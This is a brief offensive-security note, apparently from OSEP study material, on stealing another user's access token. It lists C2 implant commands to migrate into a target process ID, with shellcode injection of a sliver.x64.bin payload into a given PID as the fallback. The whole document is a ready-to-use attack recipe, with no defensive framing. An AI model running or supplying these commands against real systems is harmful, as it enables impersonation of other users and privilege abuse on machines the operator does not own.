# Steal Token

To steal token of some other user based on a running, either use migrate or execute-shellcode for that PID. Try and use migrate first and if it fails use the execute-shellcode as a fallback.

### 1) Migrate

    migrate -p 4792

### 2) Execute-shellcode

    execute-shellcode -S -r -I 30 -p 5096 /home/kali/OSEP/hav0c/sliver.x64.bin
